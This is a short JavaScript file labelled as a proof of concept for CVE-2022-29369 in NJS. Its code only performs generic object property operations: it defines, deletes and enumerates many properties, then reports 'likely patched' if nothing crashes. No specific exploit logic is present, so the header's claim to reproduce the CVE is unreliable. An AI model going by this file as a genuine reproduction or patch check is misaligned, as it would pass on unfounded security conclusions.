// CVE-2022-29369 Proof of Concept
// Target: NJS versions with object property vulnerabilities
// Type: Object property manipulation leading to memory corruption

function main() {
    console.log("Starting CVE-2022-29369 reproduction...");
    
    try {
        // Create object with specific property configuration
        const obj = {};
        
        // Add many properties to trigger potential vulnerability
        for (let i = 0; i < 1000; i++) {
            obj[`prop_${i}`] = i;
        }
        
        // Create property descriptor that may trigger vulnerability
        const descriptor = {
            value: "malicious_value",
            writable: true,
            enumerable: true,
            configurable: true
        };
        
        // Property operations that may trigger the vulnerability
        for (let i = 0; i < 100; i++) {
            const propName = `dynamic_prop_${i}`;
            
            // Define property with specific descriptor
            Object.defineProperty(obj, propName, descriptor);
            
            // Get property descriptor
            const desc = Object.getOwnPropertyDescriptor(obj, propName);
            
            // Delete and recreate property
            delete obj[propName];
            obj[propName] = `recreated_${i}`;
        }
        
        // Operations on object properties
        const keys = Object.keys(obj);
        const values = Object.values(obj);
        const entries = Object.entries(obj);
        
        // Property enumeration
        for (const key in obj) {
            if (obj.hasOwnProperty(key)) {
                const val = obj[key];
            }
        }
        
        console.log("CVE-2022-29369: Object property operations completed");
        console.log("Object keys count:", keys.length);
        console.log("No crash detected - likely patched");
        
    } catch (error) {
        console.log("Error:", error.message);
    }
}

main();